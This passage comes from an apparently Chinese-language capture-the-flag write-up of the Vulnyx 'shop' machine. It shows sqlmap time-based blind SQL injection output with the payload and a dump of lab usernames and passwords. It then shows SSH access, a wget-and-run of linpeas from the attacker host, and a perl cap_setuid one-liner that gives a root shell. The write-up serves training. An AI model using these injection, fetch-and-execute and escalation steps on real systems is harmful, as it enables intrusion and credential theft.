process it? [Y/n/q] Y\n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">58</span>] [INFO] resuming back-end DBMS <span class=\"hljs-string\">'mysql'</span> \n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">58</span>] [INFO] testing connection to the target URL\nsqlmap resumed the following injection <span class=\"hljs-title function_\">point</span><span class=\"hljs-params\">(s)</span> from stored session:\n---\nParameter: #<span class=\"hljs-number\">1</span>* ((custom) POST)\n    Type: time-based blind\n    Title: MySQL >= <span class=\"hljs-number\">5.0</span><span class=\"hljs-number\">.12</span> AND time-based <span class=\"hljs-title function_\">blind</span> <span class=\"hljs-params\">(query SLEEP)</span>\n    Payload: username=<span class=\"hljs-string\">' AND (SELECT 2729 FROM (SELECT(SLEEP(5)))Itjy) AND '</span>ETDU<span class=\"hljs-string\">'='</span>ETDU&#x26;password=<span class=\"hljs-number\">1</span>&#x26;submit=\n---\n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">58</span>] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Debian <span class=\"hljs-number\">10</span> (buster)\nweb application technology: Apache <span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.38</span>\nback-end DBMS: MySQL >= <span class=\"hljs-number\">5.0</span><span class=\"hljs-number\">.12</span> (MariaDB fork)\n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">58</span>] [INFO] fetching current database\n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">53</span>:<span class=\"hljs-number\">58</span>] [WARNING] time-based comparison <span class=\"hljs-keyword\">requires</span> larger statistical model, please wait.............................. (done)                                                                                                \n<span class=\"hljs-keyword\">do</span> you want sqlmap to <span class=\"hljs-keyword\">try</span> to optimize <span class=\"hljs-title function_\">value</span><span class=\"hljs-params\">(s)</span> <span class=\"hljs-keyword\">for</span> DBMS delay <span class=\"hljs-title function_\">responses</span> <span class=\"hljs-params\">(option <span class=\"hljs-string\">'--time-sec'</span>)</span>? [Y/n] Y\n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">04</span>] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions \n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">14</span>] [INFO] adjusting time delay to <span class=\"hljs-number\">1</span> second due to good response times\nWebapp\ncurrent database: <span class=\"hljs-string\">'Webapp'</span>\n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">31</span>] [INFO] fetched data logged to text files under <span class=\"hljs-string\">'/root/.local/share/sqlmap/output/192.168.56.40'</span>\n\n[*] ending @ <span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">54</span>:<span class=\"hljs-number\">31</span> /<span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">03</span>-<span class=\"hljs-number\">07</span>/\n</code></pre>\n<p>获取当前数据库<code>Webapp</code> 的数据表</p>\n<pre><code class=\"hljs language-java\"> sqlmap -r packet --batch -D Webapp --tables                              \n        ___                                            \n       __H__                                                                                                   \n ___ ___[)]_____ ___ ___  {<span class=\"hljs-number\">1.8</span><span class=\"hljs-number\">.11</span>#stable}              \n|_ -| . [)]     | .<span class=\"hljs-string\">'| . |                                                                                      \n|___|_  [)]_|_|_|__,|  _|                \n      |_|V...       |_|   https://sqlmap.org\n                                                                                                               \n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and arnd are not responsible <span class=\"hljs-keyword\">for</span> any misuse or damage caused by <span class=\"hljs-built_in\">this</span> program                                         \n                                                                                                                                                                                                                               \n[*] starting @ <span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">57</span>:<span class=\"hljs-number\">03</span> /<span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">03</span>-<span class=\"hljs-number\">07</span>/                                                                           \n                                                       \n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">57</span>:<span class=\"hljs-number\">03</span>] [INFO] parsing HTTP request from <span class=\"hljs-string\">'packet'</span>\ncustom injection <span class=\"hljs-title function_\">marker</span> <span class=\"hljs-params\">(<span class=\"hljs-string\">'*'</span>)</span> found in POST body. Do you want to process it? [Y/n/q] Y                         \n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">57</span>:<span class=\"hljs-number\">03</span>] [INFO] resuming back-end DBMS <span class=\"hljs-string\">'mysql'</span>                                                               \n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">57</span>:<span class=\"hljs-number\">03</span>] [INFO] testing connection to the target URL                                                         \nsqlmap resumed the following injection <span class=\"hljs-title function_\">point</span><span class=\"hljs-params\">(s)</span> from stored session:                                           \n---                                                                                                            \nParameter: #<span class=\"hljs-number\">1</span>* ((custom) POST)                                                                                 \n    Type: time-based blind                                                                                     \n    Title: MySQL >= <span class=\"hljs-number\">5.0</span><span class=\"hljs-number\">.12</span> AND time-based <span class=\"hljs-title function_\">blind</span> <span class=\"hljs-params\">(query SLEEP)</span>                                                  \n    Payload: username=<span class=\"hljs-string\">' AND (SELECT 2729 FROM (SELECT(SLEEP(5)))Itjy) AND '</span>ETDU<span class=\"hljs-string\">'='</span>ETDU&#x26;password=<span class=\"hljs-number\">1</span>&#x26;submit=      \n---                                                                                                            \n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">57</span>:<span class=\"hljs-number\">03</span>] [INFO] the back-end DBMS is MySQL                                                                   \nweb server operating system: Linux Debian <span class=\"hljs-number\">10</span> (buster)  \nweb application technology: Apache <span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.38</span>   \nback-end DBMS: MySQL >= <span class=\"hljs-number\">5.0</span><span class=\"hljs-number\">.12</span> (MariaDB fork)                                                                  \n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">57</span>:<span class=\"hljs-number\">03</span>] [INFO] fetching tables <span class=\"hljs-keyword\">for</span> database: <span class=\"hljs-string\">'Webapp'</span>                                                       \n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">57</span>:<span class=\"hljs-number\">03</span>] [INFO] fetching number of tables <span class=\"hljs-keyword\">for</span> database <span class=\"hljs-string\">'Webapp'</span>                                              \n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">57</span>:<span class=\"hljs-number\">03</span>] [WARNING] time-based comparison <span class=\"hljs-keyword\">requires</span> larger statistical model, please wait.............................. (done)                                                                                                 \n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">57</span>:<span class=\"hljs-number\">03</span>] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions                                                                            \n<span class=\"hljs-keyword\">do</span> you want sqlmap to <span class=\"hljs-keyword\">try</span> to optimize <span class=\"hljs-title function_\">value</span><span class=\"hljs-params\">(s)</span> <span class=\"hljs-keyword\">for</span> DBMS delay <span class=\"hljs-title function_\">responses</span> <span class=\"hljs-params\">(option <span class=\"hljs-string\">'--time-sec'</span>)</span>? [Y/n] Y                                                                                                                         \n<span class=\"hljs-number\">1</span>                                                                                                              \n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">57</span>:08] [INFO] retrieved:                                                                                                                                                                                                   \n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">57</span>:<span class=\"hljs-number\">18</span>] [INFO] adjusting time delay to <span class=\"hljs-number\">1</span> second due to good response times                                  \nUsers                                                                                                          \nDatabase: Webapp                                                                                               \n[<span class=\"hljs-number\">1</span> table]                                              \n+-------+                                              \n| Users |                                              \n+-------+                                              \n                                                                                                               \n[<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">57</span>:<span class=\"hljs-number\">32</span>] [INFO] fetched data logged to text files under <span class=\"hljs-string\">'/root/.local/share/sqlmap/output/192.168.56.40'</span>     \n                                                       \n[*] ending @ <span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">57</span>:<span class=\"hljs-number\">32</span> /<span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">03</span>-<span class=\"hljs-number\">07</span>/                                                                \n</code></pre>\n<p>获取<code>Users</code>数据表字段名</p>\n<pre><code class=\"hljs language-java\">sqlmap -r packet --batch -D Webapp -T Users --columns\n        ___\n       __H__\n ___ ___[.]_____ ___ ___  {<span class=\"hljs-number\">1.8</span><span class=\"hljs-number\">.11</span>#stable}\n|_ -| . [<span class=\"hljs-string\">']     | .'</span>| . |\n|___|_  [)]_|_|_|__,|  _|\n      |_|V...       |_|   https:<span class=\"hljs-comment\">//sqlmap.org</span>\n\n[!] legal disclaimer: Usage of sqlmap <span class=\"hljs-keyword\">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class=\"hljs-string\">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 07:59:08 /2025-03-07/\n\n[07:59:08] [INFO] parsing HTTP request from '</span>packet<span class=\"hljs-string\">'\ncustom injection marker ('</span>*<span class=\"hljs-string\">') found in POST body. Do you want to process it? [Y/n/q] Y\n[07:59:08] [INFO] resuming back-end DBMS '</span>mysql<span class=\"hljs-string\">' \n[07:59:08] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: #1* ((custom) POST)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: username='</span> AND (SELECT <span class=\"hljs-number\">2729</span> FROM (SELECT(SLEEP(<span class=\"hljs-number\">5</span>)))Itjy) AND <span class=\"hljs-string\">'ETDU'</span>=<span class=\"hljs-string\">'ETDU&#x26;password=1&#x26;submit=\n---\n[07:59:08] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Debian 10 (buster)\nweb application technology: Apache 2.4.38\nback-end DBMS: MySQL >= 5.0.12 (MariaDB fork)\n[07:59:08] [INFO] fetching columns for table '</span>Users<span class=\"hljs-string\">' in database '</span>Webapp<span class=\"hljs-string\">'\n[07:59:08] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                                                \n[07:59:08] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions \ndo you want sqlmap to try to optimize value(s) for DBMS delay responses (option '</span>--time-sec<span class=\"hljs-string\">')? [Y/n] Y\n[07:59:23] [INFO] adjusting time delay to 1 second due to good response times\n3\n[07:59:23] [INFO] retrieved: id\n[07:59:29] [INFO] retrieved: int(6)\n[07:59:55] [INFO] retrieved: username\n[08:00:17] [INFO] retrieved: varchar(32)\n[08:00:52] [INFO] retrieved: password\n[08:01:19] [INFO] retrieved: varchar(32)\nDatabase: Webapp\nTable: Users\n[3 columns]\n+----------+-------------+\n| Column   | Type        |\n+----------+-------------+\n| id       | int(6)      |\n| password | varchar(32) |\n| username | varchar(32) |\n+----------+-------------+\n\n[08:01:54] [INFO] fetched data logged to text files under '</span>/root/.local/share/sqlmap/output/<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.40</span><span class=\"hljs-string\">'\n\n[*] ending @ 08:01:54 /2025-03-07/\n</span></code></pre>\n<p>我们感兴趣的只有<code>username</code>和<code>password</code> ，将其Dump下来</p>\n<pre><code class=\"hljs language-java\">sqlmap -r packet --batch -D Webapp -T Users --dump   \n        ___\n       __H__\n ___ ___[(]_____ ___ ___  {<span class=\"hljs-number\">1.8</span><span class=\"hljs-number\">.11</span>#stable}\n|_ -| . [(]     | .<span class=\"hljs-string\">'| . |\n|___|_  [\"]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class=\"hljs-keyword\">for</span> any misuse or damage caused by <span class=\"hljs-built_in\">this</span> program\n\n[*] starting @ 08:<span class=\"hljs-number\">03</span>:<span class=\"hljs-number\">47</span> /<span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">03</span>-<span class=\"hljs-number\">07</span>/\n\n[08:<span class=\"hljs-number\">03</span>:<span class=\"hljs-number\">47</span>] [INFO] parsing HTTP request from <span class=\"hljs-string\">'packet'</span>\ncustom injection <span class=\"hljs-title function_\">marker</span> <span class=\"hljs-params\">(<span class=\"hljs-string\">'*'</span>)</span> found in POST body. Do you want to process it? [Y/n/q] Y\n[08:<span class=\"hljs-number\">03</span>:<span class=\"hljs-number\">47</span>] [INFO] resuming back-end DBMS <span class=\"hljs-string\">'mysql'</span> \n[08:<span class=\"hljs-number\">03</span>:<span class=\"hljs-number\">47</span>] [INFO] testing connection to the target URL\nsqlmap resumed the following injection <span class=\"hljs-title function_\">point</span><span class=\"hljs-params\">(s)</span> from stored session:\n---\nParameter: #<span class=\"hljs-number\">1</span>* ((custom) POST)\n    Type: time-based blind\n    Title: MySQL >= <span class=\"hljs-number\">5.0</span><span class=\"hljs-number\">.12</span> AND time-based <span class=\"hljs-title function_\">blind</span> <span class=\"hljs-params\">(query SLEEP)</span>\n    Payload: username=<span class=\"hljs-string\">' AND (SELECT 2729 FROM (SELECT(SLEEP(5)))Itjy) AND '</span>ETDU<span class=\"hljs-string\">'='</span>ETDU&#x26;password=<span class=\"hljs-number\">1</span>&#x26;submit=\n---\n[08:<span class=\"hljs-number\">03</span>:<span class=\"hljs-number\">47</span>] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Debian <span class=\"hljs-number\">10</span> (buster)\nweb application technology: Apache <span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.38</span>\nback-end DBMS: MySQL >= <span class=\"hljs-number\">5.0</span><span class=\"hljs-number\">.12</span> (MariaDB fork)\n[08:<span class=\"hljs-number\">03</span>:<span class=\"hljs-number\">47</span>] [INFO] fetching columns <span class=\"hljs-keyword\">for</span> table <span class=\"hljs-string\">'Users'</span> in database <span class=\"hljs-string\">'Webapp'</span>\n[08:<span class=\"hljs-number\">03</span>:<span class=\"hljs-number\">47</span>] [INFO] resumed: <span class=\"hljs-number\">3</span>\n[08:<span class=\"hljs-number\">03</span>:<span class=\"hljs-number\">47</span>] [INFO] resumed: id\n[08:<span class=\"hljs-number\">03</span>:<span class=\"hljs-number\">47</span>] [INFO] resumed: username\n[08:<span class=\"hljs-number\">03</span>:<span class=\"hljs-number\">47</span>] [INFO] resumed: password\n[08:<span class=\"hljs-number\">03</span>:<span class=\"hljs-number\">47</span>] [INFO] fetching entries <span class=\"hljs-keyword\">for</span> table <span class=\"hljs-string\">'Users'</span> in database <span class=\"hljs-string\">'Webapp'</span>\n[08:<span class=\"hljs-number\">03</span>:<span class=\"hljs-number\">47</span>] [INFO] fetching number of entries <span class=\"hljs-keyword\">for</span> table <span class=\"hljs-string\">'Users'</span> in database <span class=\"hljs-string\">'Webapp'</span>\n[08:<span class=\"hljs-number\">03</span>:<span class=\"hljs-number\">47</span>] [WARNING] time-based comparison <span class=\"hljs-keyword\">requires</span> larger statistical model, please wait.............................. (done)                                                                                                \n<span class=\"hljs-keyword\">do</span> you want sqlmap to <span class=\"hljs-keyword\">try</span> to optimize <span class=\"hljs-title function_\">value</span><span class=\"hljs-params\">(s)</span> <span class=\"hljs-keyword\">for</span> DBMS delay <span class=\"hljs-title function_\">responses</span> <span class=\"hljs-params\">(option <span class=\"hljs-string\">'--time-sec'</span>)</span>? [Y/n] Y\n[08:<span class=\"hljs-number\">03</span>:<span class=\"hljs-number\">53</span>] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions \n<span class=\"hljs-number\">4</span>\n[08:<span class=\"hljs-number\">03</span>:<span class=\"hljs-number\">53</span>] [WARNING] (<span class=\"hljs-keyword\">case</span>) time-based comparison <span class=\"hljs-keyword\">requires</span> reset of statistical model, please wait.............................. (done)                                                                                       \n[08:<span class=\"hljs-number\">04</span>:<span class=\"hljs-number\">03</span>] [INFO] adjusting time delay to <span class=\"hljs-number\">1</span> second due to good response times\n<span class=\"hljs-number\">1</span>\n[08:<span class=\"hljs-number\">04</span>:<span class=\"hljs-number\">03</span>] [INFO] retrieved: peter123!\n[08:<span class=\"hljs-number\">04</span>:<span class=\"hljs-number\">30</span>] [INFO] retrieved: peter\n[08:<span class=\"hljs-number\">04</span>:<span class=\"hljs-number\">47</span>] [INFO] retrieved: <span class=\"hljs-number\">2</span>\n[08:<span class=\"hljs-number\">04</span>:<span class=\"hljs-number\">51</span>] [INFO] retrieved: mikeblabla\n[08:<span class=\"hljs-number\">05</span>:<span class=\"hljs-number\">16</span>] [INFO] retrieved: mike\n[08:<span class=\"hljs-number\">05</span>:<span class=\"hljs-number\">27</span>] [INFO] retrieved: <span class=\"hljs-number\">3</span>\n[08:<span class=\"hljs-number\">05</span>:<span class=\"hljs-number\">30</span>] [INFO] retrieved: b4rtp0w4\n[08:<span class=\"hljs-number\">06</span>:<span class=\"hljs-number\">04</span>] [INFO] retrieved: bart\n[08:<span class=\"hljs-number\">06</span>:<span class=\"hljs-number\">15</span>] [INFO] retrieved: <span class=\"hljs-number\">4</span>\n[08:<span class=\"hljs-number\">06</span>:<span class=\"hljs-number\">19</span>] [INFO] retrieved: liam<span class=\"hljs-meta\">@nd3rs0n</span>\n[08:<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">03</span>] [INFO] retrieved: liam\nDatabase: Webapp\nTable: Users\n[<span class=\"hljs-number\">4</span> entries]\n+----+--------------+----------+\n| id | password     | username |\n+----+--------------+----------+\n| <span class=\"hljs-number\">1</span>  | peter123!    | peter    |\n| <span class=\"hljs-number\">2</span>  | mikeblabla   | mike     |\n| <span class=\"hljs-number\">3</span>  | b4rtp0w4     | bart     |\n| <span class=\"hljs-number\">4</span>  | liam<span class=\"hljs-meta\">@nd3rs0n</span> | liam     |\n+----+--------------+----------+\n\n[08:<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">15</span>] [INFO] table <span class=\"hljs-string\">'Webapp.Users'</span> dumped to CSV file <span class=\"hljs-string\">'/root/.local/share/sqlmap/output/192.168.56.40/dump/Webapp/Users.csv'</span>\n[08:<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">15</span>] [INFO] fetched data logged to text files under <span class=\"hljs-string\">'/root/.local/share/sqlmap/output/192.168.56.40'</span>\n\n[*] ending @ 08:<span class=\"hljs-number\">07</span>:<span class=\"hljs-number\">15</span> /<span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">03</span>-<span class=\"hljs-number\">07</span>/\n</code></pre>\n<p>得到四对账户密码，进行后台登录，都可以进去，但是没有任何功能</p>\n<p><img src=\"/post-images/Vulnyxshop/image34.png\" alt=\"image.png\"></p>\n<p>可以将得到用户尝试进行SSH登录</p>\n<p>最后，bart用户可以登陆进去</p>\n<p><img src=\"/post-images/Vulnyxshop/image35.png\" alt=\"image.png\"></p>\n<h2>提权</h2>\n<p>当前目录下存在<code>user.txt</code> ，就是<code>user</code>的旗帜</p>\n<pre><code class=\"hljs language-java\">bart<span class=\"hljs-meta\">@shop</span>:~$ cat user.txt \n598a05f84190e327bc4796335d948144\n</code></pre>\n<p>信息收集一波</p>\n<pre><code class=\"hljs language-java\">bart<span class=\"hljs-meta\">@shop</span>:~$ id\nuid=<span class=\"hljs-number\">1000</span>(bart) gid=<span class=\"hljs-number\">1000</span>(bart) grupos=<span class=\"hljs-number\">1000</span>(bart)\nbart<span class=\"hljs-meta\">@shop</span>:~$ uname -a\nLinux shop <span class=\"hljs-number\">4.19</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">16</span>-amd64 #<span class=\"hljs-number\">1</span> SMP Debian <span class=\"hljs-number\">4.19</span><span class=\"hljs-number\">.181</span>-<span class=\"hljs-number\">1</span> (<span class=\"hljs-number\">2021</span>-<span class=\"hljs-number\">03</span>-<span class=\"hljs-number\">19</span>) x86_64 GNU/Linux\nbart<span class=\"hljs-meta\">@shop</span>:~$ ip add\n<span class=\"hljs-number\">1</span>: lo: &#x3C;LOOPBACK,UP,LOWER_UP> mtu <span class=\"hljs-number\">65536</span> qdisc noqueue state UNKNOWN group <span class=\"hljs-keyword\">default</span> qlen <span class=\"hljs-number\">1000</span>\n    link/loopback <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> brd <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>\n    inet <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span>/<span class=\"hljs-number\">8</span> scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::<span class=\"hljs-number\">1</span>/<span class=\"hljs-number\">128</span> scope host \n       valid_lft forever preferred_lft forever\n<span class=\"hljs-number\">2</span>: enp0s3: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu <span class=\"hljs-number\">1500</span> qdisc pfifo_fast state UP group <span class=\"hljs-keyword\">default</span> qlen <span class=\"hljs-number\">1000</span>\n    link/ether 08:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">27</span>:4a:d6:de brd ff:ff:ff:ff:ff:ff\n    inet <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.40</span>/<span class=\"hljs-number\">24</span> brd <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.56</span><span class=\"hljs-number\">.255</span> scope global dynamic enp0s3\n       valid_lft 568sec preferred_lft 568sec\n    inet6 fe80::a00:27ff:fe4a:d6de/<span class=\"hljs-number\">64</span> scope link \n       valid_lft forever preferred_lft forever\n</code></pre>\n<p>查看存在<code>suid</code>的程序</p>\n<pre><code class=\"hljs language-java\">bart<span class=\"hljs-meta\">@shop</span>:~$ find / -perm -u=s -type f <span class=\"hljs-number\">2</span>>/dev/<span class=\"hljs-literal\">null</span>\n/usr/bin/umount\n/usr/bin/chsh\n/usr/bin/mount\n/usr/bin/chfn\n/usr/bin/gpasswd\n/usr/bin/su\n/usr/bin/newgrp\n/usr/bin/passwd\n/usr/lib/dbus-<span class=\"hljs-number\">1.0</span>/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n</code></pre>\n<p>查看权限，提示未找到，那么就不能使用<code>sudo</code>提权了</p>\n<pre><code class=\"hljs language-java\">bart<span class=\"hljs-meta\">@shop</span>:~/alternatives$ sudo -l\n-bash: sudo: orden no encontrada\n</code></pre>\n<p>上传Linpea进行信息收集，<a href=\"https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS\">https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS</a></p>\n<pre><code class=\"hljs language-java\">cd /tmp\nwget &#x3C;kali_ip>/linpeas.sh\nchmod +x linpeas.sh\n./linpeas.sh\n</code></pre>\n<p>收集到<code>perl</code>拥有奇怪的权限</p>\n<pre><code class=\"hljs language-java\">╚ Parent process capabilities                                                                                  \nCapInh:  <span class=\"hljs-number\">0x0000000000000000</span>=                                                                                                                                                                                                   \nCapPrm:  <span class=\"hljs-number\">0x0000000000000000</span>=                                                                                   \nCapEff:  <span class=\"hljs-number\">0x0000000000000000</span>=                                                                                   \nCapBnd:  <span class=\"hljs-number\">0x0000003fffffffff</span>=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_ra\nw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_wr\nite,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read                                                                                                    \nCapAmb:  <span class=\"hljs-number\">0x0000000000000000</span>=                                                                                                                                                                                                   \n                                                                                                                                                                                                                               \n                                                                                                               \nFiles with <span class=\"hljs-title function_\">capabilities</span> <span class=\"hljs-params\">(limited to <span class=\"hljs-number\">50</span>)</span>:                                                                                                                                                                                       \n/usr/bin/perl5<span class=\"hljs-number\">.28</span><span class=\"hljs-number\">.1</span> = cap_setuid+ep                                                                                                                                                                                            \n/usr/bin/perl = cap_setuid+ep     \n</code></pre>\n<p><img src=\"/post-images/Vulnyxshop/image36.png\" alt=\"image.png\"></p>\n<p><code>cap_setuid+ep</code> 是 Linux <strong>capabilities</strong>（能力）的一个权限，具体含义如下：</p>\n<ol>\n<li><strong><code>cap_setuid</code></strong>：允许进程更改其自身的 <strong>UID（User ID）</strong>，相当于 <code>setuid()</code> 系统调用的权限。这意味着即使进程不是 root 用户运行，它仍然可以更改其 UID。</li>\n<li><strong><code>+ep</code></strong>：\n<ul>\n<li><strong><code>e</code>（Effective）</strong>：进程可以实际使用 <code>cap_setuid</code>。</li>\n<li><strong><code>p</code>（Permitted）</strong>：进程拥有该能力。</li>\n</ul>\n</li>\n</ol>\n<p>可以更改其<code>UID</code> ，我们尝试将其改为<code>root</code> ，在<a href=\"https://gtfobins.github.io/gtfobins/perl/%E4%B8%AD%E5%8F%AF%E4%BB%A5%E6%89%BE%E5%88%B0%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95\">https://gtfobins.github.io/gtfobins/perl/中可以找到利用方法</a></p>\n<p><img src=\"/post-images/Vulnyxshop/image37.png\" alt=\"image.png\"></p>\n<p>进行提权，获得root权限</p>\n<pre><code class=\"hljs language-java\">bart<span class=\"hljs-meta\">@shop</span>:/tmp$ perl -e <span class=\"hljs-string\">'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'</span>\n# id\nuid=<span class=\"hljs-number\">0</span>(root) gid=<span class=\"hljs-number\">1000</span>(bart) grupos=<span class=\"hljs-number\">1000</span>(bart)\n</code></pre>\n<p><img src=\"/post-images/Vulnyxshop/image38.png\" alt=\"image.png\"></p>\n<p>读取<code>root.txt</code></p>\n<pre><code class=\"hljs language-java\"># cat /root/root.txt\n1c4cddb6c20e0e756163b2a9714a1260\n</code></pre>","title":"Vulnyx - shop","date":"2025-04-03","updated":"2025-04-03","comments":true,"tags":["Vulnyx","Linux靶机"],"categories":"靶机","description":"shop 前期踩点 扫描存活主机，40是靶机 扫描端口，指定10000速率 扫描主机信息以及服务信息 漏洞扫描，扫出来一些令人感兴趣的文件夹，以及登陆页面 访问HTTP服务，并查看指纹信息 主页上的连接全是无效的，从nmap枚举出来文件入手 WEB渗透 访问login.php 扫描一下目录 尝试进行..."},"recentPosts":[{"id":"TheHackersLabsAllSafe","title":"TheHackersLabs - AllSafe","date":"2025-10-21","isEncrypted":false,"year":"2025","month":"10","day":"21"},{"id":"TheHackersLabsLavaShop","title":"TheHackersLabs - LavaShop","date":"2025-10-20","isEncrypted":false,"year":"2025","month":"10","day":"20"},{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"}]},"__N_SSG":true}